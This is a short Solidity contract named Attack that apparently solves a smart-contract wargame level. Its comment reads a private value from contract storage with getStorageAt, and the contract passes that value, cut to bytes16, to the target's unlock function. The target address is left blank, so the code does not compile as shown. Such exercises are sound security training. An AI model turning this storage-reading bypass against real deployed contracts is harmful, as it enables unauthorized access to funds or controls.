// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Instance {
    function unlock(bytes32) external;
}

contract Attack {

    Instance instance = Instance();

    function unlock(bytes32 data) public {
        
        instance.unlock(bytes16(data));
    }

}

//await web3.eth.getStorageAt(instance, 5)
